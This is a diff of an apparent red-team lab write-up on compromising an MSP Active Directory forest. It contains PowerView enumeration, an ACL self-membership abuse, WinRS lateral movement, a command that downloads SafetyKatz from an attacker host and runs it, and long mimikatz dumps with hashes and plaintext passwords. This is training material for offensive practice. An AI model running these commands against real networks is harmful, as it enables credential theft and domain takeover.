+ 5c 2e e1 5d 1f 8b 28 27 3a cb 0c cb 37 40 b9 42 a3 c1 30 0c 7b ca cd 3a bd fb f2 64 1a df 80 e2 e2 bf 3e e2 92 52 e0 b
+e ac 10 11 a4 eb ec 46 fb 1c 0f 97 66 84 b2 94 fa 33 da 68 74 d4 c6 39 3c e7 c4 09 85 d2 d2 9e 7d 8b b0 b4 2f 15 df e5 
+41 39 7e 7a ef e6 cb cb fb 8d bb d6 1a 9e e8 f8 64 c2 38 0c f2 27 8c 2b 69 56 62 ed c1 19 46 2a 69 58 8c 2c 6b d2 1c ba
+ 6b 93 68 06 ee 81 80 71 20 
 	ssp :	
 	 [00000000]
 	 * Username : mspdb
@@ -2250,31 +1916,248 @@ SID               : S-1-5-21-2302994670-2188927374-388541401-500
 	 * Domain   : MSP-SRV01
 	 * Password : (null)
 	ssp :	
-	credman :</code></pre>
-</details>
-
-<p>If we try to import PowerView for enumeration and execute it without passing the credential's it seems like we are facing the same Kerberos Double-Hopping once again. So It's is better to pass the credentials as we did previously for the enumeration. Let's now try to enumerate the domain trusts.</p>
-
-<p><code>$passwd = ConvertTo-SecureString "Vend0r'sDatabaseSecret" -AsPlainText -Force<br/>$creds = New-Object System.Management.Automation.PSCredential ("msp\mspdb", $passwd)</code></p>
-
-<p><code>Get-DomainTrust -Credential $creds</code></p>
-
-<figure><img src="../../assets/crtm/image 87.png" alt="Domain Trusts"/></figure>
-
-<h2>Enumerating Users</h2>
-
-<p>Let's start by enumerating the internal.msp.local users.
-<code>Get-DomainUser -Domain 'internal.msp.local' -Credential $Creds | Select -ExpandProperty 'name'</code></p>
-
-<figure><img src="../../assets/crtm/image 88.png" alt="Users Enumeration"/></figure>
-
-<details class="toggle">
-<summary><strong>Groups in internal.msp.local</strong></summary>
-<pre><code>Users
+	credman :	
+ 
+Authentication Id : 0 ; 996 (00000000:000003e4)
+Session           : Service from 0
+User Name         : MSP-SRV01$
+Domain            : MSP
+Logon Server      : (null)
+Logon Time        : 2/15/2024 6:06:17 AM
+SID               : S-1-5-20
+	msv :	
+	 [00000003] Primary
+	 * Username : MSP-SRV01$
+	 * Domain   : MSP
+	 * NTLM     : 51cadf87076f5d9e8938f675ccf08518
+	 * SHA1     : 1d6f67adfb8954169ff0a940bdd8d438f9a7fa1f
+	 * DPAPI    : 1d6f67adfb8954169ff0a940bdd8d438
+	tspkg :	
+	wdigest :	
+	 * Username : MSP-SRV01$
+	 * Domain   : MSP
+	 * Password : (null)
+	kerberos :	
+	 * Username : msp-srv01$
+	 * Domain   : MSP.LOCAL
+	 * Password : (null)
+	ssp :	
+	credman :	
+ 
+Authentication Id : 0 ; 59639 (00000000:0000e8f7)
+Session           : Interactive from 0
+User Name         : UMFD-0
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 2/15/2024 6:06:17 AM
+SID               : S-1-5-96-0-0
+	msv :	
+	 [00000003] Primary
+	 * Username : MSP-SRV01$
+	 * Domain   : MSP
+	 * NTLM     : 51cadf87076f5d9e8938f675ccf08518
+	 * SHA1     : 1d6f67adfb8954169ff0a940bdd8d438f9a7fa1f
+	 * DPAPI    : 1d6f67adfb8954169ff0a940bdd8d438
+	tspkg :	
+	wdigest :	
+	 * Username : MSP-SRV01$
+	 * Domain   : MSP
+	 * Password : (null)
+	kerberos :	
+	 * Username : MSP-SRV01$
+	 * Domain   : msp.local
+	 * Password : 73 de e3 e9 b3 aa 2b e0 bf 4e 99 59 ce e2 55 4a 3e 0c 98 db e0 fc 4e e7 a6 80 9a b9 4a 75 c6 c4 a
+5 1d 4c 95 fe 11 e0 9c 0d 3a 6e 8e 55 a7 ca 87 55 8a c8 7e 95 c7 96 07 25 a4 8d 6d bf d8 9d cf 10 8b 8b 1a 94 88 98 2a 
+8d 60 e5 4b 76 45 21 fb e9 79 9a 91 9e 60 10 20 74 f2 5f cb 81 9f f0 1e de f7 af 0c e5 5b 2c bf a9 47 19 fd 67 c7 4c 0e
+ 5c 2e e1 5d 1f 8b 28 27 3a cb 0c cb 37 40 b9 42 a3 c1 30 0c 7b ca cd 3a bd fb f2 64 1a df 80 e2 e2 bf 3e e2 92 52 e0 b
+e ac 10 11 a4 eb ec 46 fb 1c 0f 97 66 84 b2 94 fa 33 da 68 74 d4 c6 39 3c e7 c4 09 85 d2 d2 9e 7d 8b b0 b4 2f 15 df e5 
+41 39 7e 7a ef e6 cb cb fb 8d bb d6 1a 9e e8 f8 64 c2 38 0c f2 27 8c 2b 69 56 62 ed c1 19 46 2a 69 58 8c 2c 6b d2 1c ba
+ 6b 93 68 06 ee 81 80 71 20 
+	ssp :	
+	credman :	
+ 
+Authentication Id : 0 ; 186266841 (00000000:0b1a34d9)
+Session           : Service from 0
+User Name         : DefaultAppPool
+Domain            : IIS APPPOOL
+Logon Server      : (null)
+Logon Time        : 4/21/2025 3:27:46 PM
+SID               : S-1-5-82-3006700770-424185619-1745488364-794895919-4004696415
+	msv :	
+	 [00000003] Primary
+	 * Username : MSP-SRV01$
+	 * Domain   : MSP
+	 * NTLM     : 51cadf87076f5d9e8938f675ccf08518
+	 * SHA1     : 1d6f67adfb8954169ff0a940bdd8d438f9a7fa1f
+	 * DPAPI    : 1d6f67adfb8954169ff0a940bdd8d438
+	tspkg :	
+	wdigest :	
+	 * Username : MSP-SRV01$
+	 * Domain   : MSP
+	 * Password : (null)
+	kerberos :	
+	 * Username : MSP-SRV01$
+	 * Domain   : msp.local
+	 * Password : 73 de e3 e9 b3 aa 2b e0 bf 4e 99 59 ce e2 55 4a 3e 0c 98 db e0 fc 4e e7 a6 80 9a b9 4a 75 c6 c4 a
+5 1d 4c 95 fe 11 e0 9c 0d 3a 6e 8e 55 a7 ca 87 55 8a c8 7e 95 c7 96 07 25 a4 8d 6d bf d8 9d cf 10 8b 8b 1a 94 88 98 2a 
+8d 60 e5 4b 76 45 21 fb e9 79 9a 91 9e 60 10 20 74 f2 5f cb 81 9f f0 1e de f7 af 0c e5 5b 2c bf a9 47 19 fd 67 c7 4c 0e
+ 5c 2e e1 5d 1f 8b 28 27 3a cb 0c cb 37 40 b9 42 a3 c1 30 0c 7b ca cd 3a bd fb f2 64 1a df 80 e2 e2 bf 3e e2 92 52 e0 b
+e ac 10 11 a4 eb ec 46 fb 1c 0f 97 66 84 b2 94 fa 33 da 68 74 d4 c6 39 3c e7 c4 09 85 d2 d2 9e 7d 8b b0 b4 2f 15 df e5 
+41 39 7e 7a ef e6 cb cb fb 8d bb d6 1a 9e e8 f8 64 c2 38 0c f2 27 8c 2b 69 56 62 ed c1 19 46 2a 69 58 8c 2c 6b d2 1c ba
+ 6b 93 68 06 ee 81 80 71 20 
+	ssp :	
+	credman :	
+ 
+Authentication Id : 0 ; 995 (00000000:000003e3)
+Session           : Service from 0
+User Name         : IUSR
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 4/20/2024 1:15:44 AM
+SID               : S-1-5-17
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+	kerberos :	
+	ssp :	
+	credman :	
+ 
+Authentication Id : 0 ; 240602 (00000000:0003abda)
+Session           : Interactive from 2
+User Name         : UMFD-2
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 2/15/2024 6:06:53 AM
+SID               : S-1-5-96-0-2
+	msv :	
+	 [00000003] Primary
+	 * Username : MSP-SRV01$
+	 * Domain   : MSP
+	 * NTLM     : 51cadf87076f5d9e8938f675ccf08518
+	 * SHA1     : 1d6f67adfb8954169ff0a940bdd8d438f9a7fa1f
+	 * DPAPI    : 1d6f67adfb8954169ff0a940bdd8d438
+	tspkg :	
+	wdigest :	
+	 * Username : MSP-SRV01$
+	 * Domain   : MSP
+	 * Password : (null)
+	kerberos :	
+	 * Username : MSP-SRV01$
+	 * Domain   : msp.local
+	 * Password : 73 de e3 e9 b3 aa 2b e0 bf 4e 99 59 ce e2 55 4a 3e 0c 98 db e0 fc 4e e7 a6 80 9a b9 4a 75 c6 c4 a
+5 1d 4c 95 fe 11 e0 9c 0d 3a 6e 8e 55 a7 ca 87 55 8a c8 7e 95 c7 96 07 25 a4 8d 6d bf d8 9d cf 10 8b 8b 1a 94 88 98 2a 
+8d 60 e5 4b 76 45 21 fb e9 79 9a 91 9e 60 10 20 74 f2 5f cb 81 9f f0 1e de f7 af 0c e5 5b 2c bf a9 47 19 fd 67 c7 4c 0e
+ 5c 2e e1 5d 1f 8b 28 27 3a cb 0c cb 37 40 b9 42 a3 c1 30 0c 7b ca cd 3a bd fb f2 64 1a df 80 e2 e2 bf 3e e2 92 52 e0 b
+e ac 10 11 a4 eb ec 46 fb 1c 0f 97 66 84 b2 94 fa 33 da 68 74 d4 c6 39 3c e7 c4 09 85 d2 d2 9e 7d 8b b0 b4 2f 15 df e5 
+41 39 7e 7a ef e6 cb cb fb 8d bb d6 1a 9e e8 f8 64 c2 38 0c f2 27 8c 2b 69 56 62 ed c1 19 46 2a 69 58 8c 2c 6b d2 1c ba
+ 6b 93 68 06 ee 81 80 71 20 
+	ssp :	
+	credman :	
+ 
+Authentication Id : 0 ; 997 (00000000:000003e5)
+Session           : Service from 0
+User Name         : LOCAL SERVICE
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 2/15/2024 6:06:18 AM
+SID               : S-1-5-19
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+	kerberos :	
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+	ssp :	
+	credman :	
+ 
+Authentication Id : 0 ; 59777 (00000000:0000e981)
+Session           : Interactive from 1
+User Name         : UMFD-1
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 2/15/2024 6:06:17 AM
+SID               : S-1-5-96-0-1
+	msv :	
+	 [00000003] Primary
+	 * Username : MSP-SRV01$
+	 * Domain   : MSP
+	 * NTLM     : 51cadf87076f5d9e8938f675ccf08518
+	 * SHA1     : 1d6f67adfb8954169ff0a940bdd8d438f9a7fa1f
+	 * DPAPI    : 1d6f67adfb8954169ff0a940bdd8d438
+	tspkg :	
+	wdigest :	
+	 * Username : MSP-SRV01$
+	 * Domain   : MSP
+	 * Password : (null)
+	kerberos :	
+	 * Username : MSP-SRV01$
+	 * Domain   : msp.local
+	 * Password : 73 de e3 e9 b3 aa 2b e0 bf 4e 99 59 ce e2 55 4a 3e 0c 98 db e0 fc 4e e7 a6 80 9a b9 4a 75 c6 c4 a
+5 1d 4c 95 fe 11 e0 9c 0d 3a 6e 8e 55 a7 ca 87 55 8a c8 7e 95 c7 96 07 25 a4 8d 6d bf d8 9d cf 10 8b 8b 1a 94 88 98 2a 
+8d 60 e5 4b 76 45 21 fb e9 79 9a 91 9e 60 10 20 74 f2 5f cb 81 9f f0 1e de f7 af 0c e5 5b 2c bf a9 47 19 fd 67 c7 4c 0e
+ 5c 2e e1 5d 1f 8b 28 27 3a cb 0c cb 37 40 b9 42 a3 c1 30 0c 7b ca cd 3a bd fb f2 64 1a df 80 e2 e2 bf 3e e2 92 52 e0 b
+e ac 10 11 a4 eb ec 46 fb 1c 0f 97 66 84 b2 94 fa 33 da 68 74 d4 c6 39 3c e7 c4 09 85 d2 d2 9e 7d 8b b0 b4 2f 15 df e5 
+41 39 7e 7a ef e6 cb cb fb 8d bb d6 1a 9e e8 f8 64 c2 38 0c f2 27 8c 2b 69 56 62 ed c1 19 46 2a 69 58 8c 2c 6b d2 1c ba
+ 6b 93 68 06 ee 81 80 71 20 
+	ssp :	
+	credman :	
+ 
+Authentication Id : 0 ; 58165 (00000000:0000e335)
+Session           : UndefinedLogonType from 0
+User Name         : (null)
+Domain            : (null)
+Logon Server      : (null)
+Logon Time        : 2/15/2024 6:06:16 AM
+SID               : 
+	msv :	
+	 [00000003] Primary
+	 * Username : MSP-SRV01$
+	 * Domain   : MSP
+	 * NTLM     : 51cadf87076f5d9e8938f675ccf08518
+	 * SHA1     : 1d6f67adfb8954169ff0a940bdd8d438f9a7fa1f
+	 * DPAPI    : 1d6f67adfb8954169ff0a940bdd8d438
+	tspkg :	
+	wdigest :	
+	kerberos :	
+	ssp :	
+	credman :	
+ 
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : MSP-SRV01$
+Domain            : MSP
+Logon Server      : (null)
+Logon Time        : 2/15/2024 6:06:16 AM
+SID               : S-1-5-18
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : MSP-SRV01$
+	 * Domain   : MSP
+	 * Password : (null)
+	kerberos :	
+	 * Username : msp-srv01$
+	 * Domain   : MSP.LOCAL
+	 * Password : (null)
+	ssp :	
+	credman :	</code></pre></div></details></li></ul></div><div dir="auto"><p class="">
+</p></div><div dir="auto"><p class="">If we try to import PowerView for enumeration and execute it without passing the credential’s it seems like we are facing the same Kerberos Double-Hoping once again. So It’s is better to pass the credentials as we did previously for the enumeration. Let’s now try to enumerate the domain trusts.</p></div><div dir="auto"><p class=""><code>$passwd = ConvertTo-SecureString "Vend0r'sDatabaseSecret" -AsPlainText -Force<br/>$creds = New-Object System.Management.Automation.PSCredential ("msp\mspdb", $passwd)</code></p></div><div dir="auto"><p class=""><code>Get-DomainTrust -Credential $creds</code></p></div><div dir="ltr"><figure class="image"><a><img style="width:2088px"/></a></figure></div><div dir="auto"><h2 class="">Enumerating Users</h2></div><div dir="auto"><p class="">Let’s start by enumerating the internal.msp.local users.<br/><code>Get-DomainUser -Domain 'internal.msp.local' -Credential $Creds | Select -ExpandProperty 'name'</code></p></div><div dir="ltr"><figure class="image"><a><img style="width:2090px"/></a></figure></div><div dir="auto"><h2 class="">Enumerating computer</h2></div><div dir="auto"><p class="">Let’s now enumerate internal.msp.local domain and find out what computers we do have.<br/><code>Get-DomainComputer -Domain 'internal.msp.local' -Credential $Creds | Select -ExpandProperty 'samaccountname’</code></p></div><div dir="ltr"><figure class="image"><a><img style="width:2092px"/></a></figure></div><div dir="auto"><h2 class="">Enumerating Groups</h2></div><div dir="auto"><p class=""><code>Get-DomainGroup -Domain 'internal.msp.local' -Credential $Creds | Select -ExpandProperty 'name'</code></p></div><div dir="auto"><ul class="toggle"><li><details open=""><summary><strong>Groups</strong></summary><div dir="auto"><pre class="code code-wrap"><code class="language-Bash">Administrators
+<pre><code>
+Users
 Guests
+</code></pre>
 Print Operators
 Backup Operators
+<pre><code>
 Replicator
+</code></pre>
 Remote Desktop Users
 Network Configuration Operators
 Performance Monitor Users
@@ -2314,69 +2197,19 @@ DnsAdmins
 DnsUpdateProxy
 ForestManagers
 InternalAdmins
-BatchUsers</code></pre>
-</details>
-
-<figure><img src="../../assets/crtm/image 90.png" alt="Groups"/></figure>
-
-<p>It is possible to see the list of all groups inside internal.msp.local. We can see above that we do have here 3 groups that are not usual domain groups. so let's focus on enumerating these groups.</p>
-
-<h2>Enumerating ACL</h2>
-
-<p><strong>WriteProperty (Self-Membership)<br/>T</strong>his allows attackers to directly add themselves to groups by modifying group properties if they have the <code>WriteProperty</code> or <code>Self</code> (Self-Membership) right on those groups.</p>
-
-<p><code>Get-ObjectAcl -DistinguishedName "ForestManagers" -Domain internal.msp.local -Credential $Creds | Where-Object { $_.ActiveDirectoryRights -match "GenericAll|GenericWrite|WriteOwner|WriteDacl|AllExtendedRights|WriteProperty|ExtendedRight|Self|CreateChild|DeleteChild" } | Select-Object SecurityIdentifier, ActiveDirectoryRights</code></p>
-
-<figure><img src="../../assets/crtm/image 91.png" alt="ACL Enumeration"/></figure>
-
-<p>If we enumerate our own RID we find our that it ends with <code><strong>1107</strong></code>. It means that our user <strong>msdb</strong> has <code><strong>Self</strong></code> Rights inside <strong>ForestManagers</strong>.</p>
-
-<p><code>whoami /all</code></p>
-
-<figure><img src="../../assets/crtm/image 92.png" alt="Whoami All"/></figure>
-
-<p>Because we're adding a <strong>user from </strong><code><strong>msp.local</strong></code> into a <strong>group in </strong><code><strong>internal.msp.local</strong></code>, we need to fully resolve the user object so that the <code>internal.msp.local</code> domain can recognize and accept it. 
-In cross-domain operations, we can't just pass a username, we have to provide a fully qualified identity the target domain understands.</p>
-
-<p><code>$SecurePassword = ConvertTo-SecureString "Vend0r'sDatabaseSecret" -AsPlainText -Force<br/>$Creds = New-Object System.Management.Automation.PSCredential("msp\mspdb", $SecurePassword)</code></p>
-
-<p><code>$mspdb = Get-ADUser -Identity 'mspdb' -Server msp.local -Credential $Creds</code></p>
-
-<p><code>Add-ADGroupMember -Identity ForestManagers -Members $mspdb -Server internal.msp.local -Credential $Creds -Verbose</code></p>
-
-<figure><img src="../../assets/crtm/image 93.png" alt="Add to ForestManagers"/></figure>
-
-<p>Now if we do enumerate the users inside <strong>ForestManagers Group</strong>, we will see that our <strong>mspdb</strong> is now member of this group inside <code>internal.msp.local</code>.</p>
-
-<p>Now if we try to access <code>internal-srv06.internal.msp.local</code> using WinRS, we access it successfully.</p>
-
-<p><code>winrs -r:internal-srv06.internal.msp.local -u:"msp\mspdb" -p:"Vend0r'sDatabaseSecret" cmd</code></p>
-
-<figure><img src="../../assets/crtm/image 95.png" alt="WinRS Internal-SRV06"/></figure>
-
-<p>As you can see above, I tried to access internal-srv06.internal.local using winrs, apparently I got access successful, but when issuing the command hostname, I see that I was still inside MSP-SRV01 and I did not understand why.
-So I decided to exit back to PSWA and this time I accessed the internal-srv06 server directly instead of MSP-SRV01.</p>
-
-<p>User; msp\mspdb<br/>Password: Vend0r'sDatabaseSecret<br/>Hostname: internal-srv06.internal.msp.local</p>
-
-<figure><img src="../../assets/crtm/image 96.png" alt="PSWA Internal-SRV06"/></figure>
-
-<h2>Dumping Credentials in Internal-srv06.internal.msp.local.</h2>
-
-<p><code>Invoke-WebRequest -Uri http://192.168.100.41:443/SafetyKatz.exe -OutFile "C:\SafeyKatz.exe" -UseBasicParsing</code></p>
-
-<p><code>C:\SafeyKatz.exe "Privilege::Debug" "sekurlsa::logonpasswords /patch" "exit"</code></p>
-
-<details class="toggle">
-<summary><strong>Creds</strong></summary>
-<pre><code>C:\SafeyKatz.exe "Privilege::Debug" "sekurlsa::logonpasswords /patch" "exit"
+BatchUsers</code></pre></div></details></li></ul></div><div dir="ltr"><figure class="image"><a><img style="width:1653px"/></a></figure></div><div dir="auto"><p class="">It is possible to see the list of all groups inside internal.msp.local. We can see above that we do have here 3 groups that are not usual domain groups. so let’s focus on enumerating these groups.</p></div><div dir="auto"><p class="">
+</p></div><div dir="auto"><h2 class="">Enumerating ACL</h2></div><div dir="auto"><p class=""><strong>WriteProperty (Self-Membership)<br/>T</strong>his allows attackers to directly add themselves to groups by modifying group properties if they have the <code>WriteProperty</code> or <code>Self</code> (Self-Membership) right on those groups. </p></div><div dir="auto"><p class=""><code>Get-ObjectAcl -DistinguishedName "ForestManagers" -Domain internal.msp.local -Credential $Creds | Where-Object { $_.ActiveDirectoryRights -match "GenericAll|GenericWrite|WriteOwner|WriteDacl|AllExtendedRights|WriteProperty|ExtendedRight|Self|CreateChild|DeleteChild" } | Select-Object SecurityIdentifier, ActiveDirectoryRights</code></p></div><div dir="ltr"><figure class="image"><a><img style="width:2090px"/></a></figure></div><div dir="auto"><p class="">If we enumerate our own RID we find our that out that it ends with <code><strong>1107</strong></code>. It means that our user <strong>msdb</strong> has <code><strong>Self</strong></code> Rights inside <strong>ForestManagers</strong>. </p></div><div dir="auto"><p class=""><code>whoami /all</code></p></div><div dir="ltr"><figure class="image"><a><img style="width:2085px"/></a></figure></div><div dir="auto"><p class="">We have just confirmed above that now we do have Self-Member on <strong>ForestManagers</strong> Group inside <code>internal.msp.local</code>. Let’s now add mspdb user inside <strong>ForestManagers</strong> group.</p></div><div dir="auto"><p class="">
+</p></div><div dir="auto"><p class="">Because we're adding a <strong>user from </strong><code><strong>msp.local</strong></code> into a <strong>group in </strong><code><strong>internal.msp.local</strong></code>, we need to fully resolve the user object so that the <code>internal.msp.local</code> domain can recognize and accept it. <br/>In cross-domain operations, we can't just pass a username, we have to provide a fully qualified identity the target domain understands.</p></div><div dir="auto"><p class=""><code>$SecurePassword = ConvertTo-SecureString "Vend0r'sDatabaseSecret" -AsPlainText -Force<br/>$Creds = New-Object System.Management.Automation.PSCredential("msp\mspdb", $SecurePassword)</code></p></div><div dir="auto"><p class=""><code>$mspdb = Get-ADUser -Identity 'mspdb' -Server msp.local -Credential $Creds</code></p></div><div dir="auto"><p class=""><code>Add-ADGroupMember -Identity ForestManagers -Members $mspdb -Server internal.msp.local -Credential $Creds -Verbose</code></p></div><div dir="ltr"><figure class="image"><a><img style="width:2089px"/></a></figure></div><div dir="auto"><p class="">Now if we do enumerate the users inside <strong>ForestManagers Group</strong>, we will see that our <strong>mspdb</strong> is now member of this group inside <code>internal.msp.local</code>.</p></div><div dir="auto"><p class=""><code>Get-ADGroupMember -Identity 'ForestManagers' -Server 'internal.msp.local' -Credential $Creds</code></p></div><div dir="ltr"><figure class="image"><a><img style="width:2087px"/></a></figure></div><div dir="auto"><p class="">
+</p></div><div dir="auto"><p class="">Now if we try to access <code>internal-srv06.internal.msp.local</code> using WinRS, we access it successfully.</p></div><div dir="auto"><p class=""><code>winrs -r:internal-srv06.internal.msp.local -u:"msp\mspdb" -p:"Vend0r'sDatabaseSecret" cmd</code></p></div><div dir="ltr"><figure class="image"><a><img style="width:2088px"/></a></figure></div><div dir="auto"><p class="">As you can see above, I tried to access internal-srv06.internal.local using winrs, apparently I got access successful, but when issuing the command hostname, I see that I was still inside MSP-SRV01 and I did not understand why. <br/>So I decided to exit back to PSWA and this time I accessed the internal-srv06 server directly instead of MSP-SRV01.</p></div><div dir="auto"><p class="">
+</p></div><div dir="auto"><p class="">User; msp\mspdb<br/>Password: Vend0r'sDatabaseSecret<br/>Hostname: internal-srv06.internal.msp.local</p></div><div dir="ltr"><figure class="image"><a><img style="width:2096px"/></a></figure></div><div dir="auto"><p class="">
+</p></div><div dir="auto"><h2 class="">Dumping Credentials in Internal-srv06.internal.msp.local.</h2></div><div dir="auto"><p class=""><code>Invoke-WebRequest -Uri </code><code><a href="http://192.168.100.41:443/SafetyKatz.exe">http://192.168.100.41:443/SafetyKatz.exe</a></code><code> -OutFile "C:\SafeyKatz.exe" -UseBasicParsing</code></p></div><div dir="auto"><p class=""><code>C:\SafeyKatz.exe "Privilege::Debug" "sekurlsa::logonpasswords /patch" "exit”</code></p></div><div dir="auto"><ul class="toggle"><li><details open=""><summary><strong>Creds</strong></summary><div dir="auto"><pre class="code code-wrap"><code class="language-Bash">C:\SafeyKatz.exe "Privilege::Debug" "sekurlsa::logonpasswords /patch" "exit"
  
   .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 16:49:51
  .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
  ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
- ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ ## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz
  '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
-  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+  '#####'        &gt; https://pingcastle.com / https://mysmartlogon.com ***/
  
 mimikatz(commandline) # Privilege::Debug
 Privilege '20' OK
@@ -2406,11 +2239,11 @@ SID               : S-1-5-96-0-2
 	 * Username : INTERNAL-SRV06$
 	 * Domain   : internal.msp.local
 	 * Password : 5e 7c f4 7f 62 66 a0 eb 04 7a 10 fe 1d 6d 37 ec 05 39 41 8b 3b f7 04 3b 0f 3e eb 4c ec 8e 22 7e e
- f ee ed e3 ce 1b a0 d4 35 c8 fd 04 c3 cc dc 09 e2 a8 dd 4f 29 c0 66 c9 48 ee 0b d8 5d c8 00 73 b4 21 fb db 57 de db 42 
- 2f 94 a0 61 5d 2c 6c ed 8c 85 4e b8 cf 26 c4 16 6b 71 f5 73 6c 09 68 d8 f3 19 b7 b2 a3 37 b3 5b 7f bd 25 6f 77 d7 76 c6
-  2d f9 29 9c 6d 8b bd 84 5b 6d d7 98 be a5 bf b9 07 50 8d 85 58 fb 44 89 09 70 48 88 58 14 ba a8 95 f7 38 50 4c c0 0a d
- 1 5e 22 1d da c4 ba 44 e2 f1 3b 89 95 77 05 5a 5c 7a ba 08 4e 09 6f 3f 58 9f 3e 91 d3 3a 91 23 38 c3 8a ee a8 b6 84 65 
- 55 94 39 f1 01 09 4d eb 6d 21 be a2 a7 e4 c9 63 35 7a c7 ef 19 2d b0 7d 6d 2d 1f f9 30 76 a7 b1 dc c2 81 34 72 81 0f a4
+f ee ed e3 ce 1b a0 d4 35 c8 fd 04 c3 cc dc 09 e2 a8 dd 4f 29 c0 66 c9 48 ee 0b d8 5d c8 00 73 b4 21 fb db 57 de db 42 
+2f 94 a0 61 5d 2c 6c ed 8c 85 4e b8 cf 26 c4 16 6b 71 f5 73 6c 09 68 d8 f3 19 b7 b2 a3 37 b3 5b 7f bd 25 6f 77 d7 76 c6
+ 2d f9 29 9c 6d 8b bd 84 5b 6d d7 98 be a5 bf b9 07 50 8d 85 58 fb 44 89 09 70 48 88 58 14 ba a8 95 f7 38 50 4c c0 0a d
+1 5e 22 1d da c4 ba 44 e2 f1 3b 89 95 77 05 5a 5c 7a ba 08 4e 09 6f 3f 58 9f 3e 91 d3 3a 91 23 38 c3 8a ee a8 b6 84 65 
+55 94 39 f1 01 09 4d eb 6d 21 be a2 a7 e4 c9 63 35 7a c7 ef 19 2d b0 7d a6 2d 1f f9 30 76 a7 b1 dc c2 81 34 72 81 0f a4
  16 ce 75 43 1d e2 c9 ba e4 
 	ssp :	
 	credman :	
@@ -2439,20 +2272,193 @@ SID               : S-1-5-21-2754435719-1041067879-922430489-1120
 	 * Domain   : INTERNAL.MSP.LOCAL
 	 * Password : Serv!ceUser4Status
 	ssp :	
-	credman :</code></pre>
-</details>
-
-<div class="course-navigation">
-  <a href="index.html" class="prev-link">← Previous: Overview</a>
-  <a href="part-02-phase-2-sections-3-4-5.html" class="next-link">Next: Phase 2 →</a>
-</div>
+	credman :	
+ 
+Authentication Id : 0 ; 996 (00000000:000003e4)
+Session           : Service from 0
+User Name         : INTERNAL-SRV06$
+Domain            : INTERNALMSP
+Logon Server      : (null)
+Logon Time        : 2/15/2024 6:02:33 AM
+SID               : S-1-5-20
+	msv :	
+	 [00000003] Primary
+	 * Username : INTERNAL-SRV06$
+	 * Domain   : INTERNALMSP
+	 * NTLM     : 5af2df4ec639a926171e4b2b301e59b0
+	 * SHA1     : 0fbb09b833d6518ae27558d43ab806581862ec3f
+	 * DPAPI    : 0fbb09b833d6518ae27558d43ab80658
+	tspkg :	
+	wdigest :	
+	 * Username : INTERNAL-SRV06$
+	 * Domain   : INTERNALMSP
+	 * Password : (null)
+	kerberos :	
+	 * Username : internal-srv06$
+	 * Domain   : INTERNAL.MSP.LOCAL
+	 * Password : 5e 7c f4 7f 62 66 a0 eb 04 7a 10 fe 1d 6d 37 ec 05 39 41 8b 3b f7 04 3b 0f 3e eb 4c ec 8e 22 7e e
+f ee ed e3 ce 1b a0 d4 35 c8 fd 04 c3 cc dc 09 e2 a8 dd 4f 29 c0 66 c9 48 ee 0b d8 5d c8 00 73 b4 21 fb db 57 de db 42 
+2f 94 a0 61 5d 2c 6c ed 8c 85 4e b8 cf 26 c4 16 6b 71 f5 73 6c 09 68 d8 f3 19 b7 b2 a3 37 b3 5b 7f bd 25 6f 77 d7 76 c6
+ 2d f9 29 9c 6d 8b bd 84 5b 6d d7 98 be a5 bf b9 07 50 8d 85 58 fb 44 89 09 70 48 88 58 14 ba a8 95 f7 38 50 4c c0 0a d
+1 5e 22 1d da c4 ba 44 e2 f1 3b 89 95 77 05 5a 5c 7a ba 08 4e 09 6f 3f 58 9f 3e 91 d3 3a 91 23 38 c3 8a ee a8 b6 84 65 
+55 94 39 f1 01 09 4d eb 6d 21 be a2 a7 e4 c9 63 35 7a c7 ef 19 2d b0 7d a6 2d 1f f9 30 76 a7 b1 dc c2 81 34 72 81 0f a4
+ 16 ce 75 43 1d e2 c9 ba e4 
+	ssp :	
+	credman :	
+ 
+Authentication Id : 0 ; 1676859 (00000000:0019963b)
+Session           : RemoteInteractive from 2
+User Name         : Administrator
+Domain            : INTERNAL-SRV06
+Logon Server      : INTERNAL-SRV06
+Logon Time        : 2/15/2024 6:19:18 AM
+SID               : S-1-5-21-2137559835-1316653602-1660959346-500
+	msv :	
+	 [00000003] Primary
+	 * Username : Administrator
+	 * Domain   : INTERNAL-SRV06
+	 * NTLM     : 5d4d4a0d623b9d2e5aa51b4819b8cdf3
+	 * SHA1     : 126648e9112b5dabdd160748210f5fe519730105
+	 * DPAPI    : 126648e9112b5dabdd160748210f5fe5
+	tspkg :	
+	wdigest :	
+	 * Username : Administrator
+	 * Domain   : INTERNAL-SRV06
+	 * Password : (null)
+	kerberos :	
+	 * Username : Administrator
+	 * Domain   : INTERNAL-SRV06
+	 * Password : (null)
+	ssp :	
+	credman :	
+ 
+Authentication Id : 0 ; 997 (00000000:000003e5)
+Session           : Service from 0
+User Name         : LOCAL SERVICE
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 2/15/2024 6:02:34 AM
+SID               : S-1-5-19
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+	kerberos :	
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+	ssp :	
+	credman :	
+ 
+Authentication Id : 0 ; 59825 (00000000:0000e9b1)
+Session           : Interactive from 1
+User Name         : UMFD-1
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 2/15/2024 6:02:32 AM
+SID               : S-1-5-96-0-1
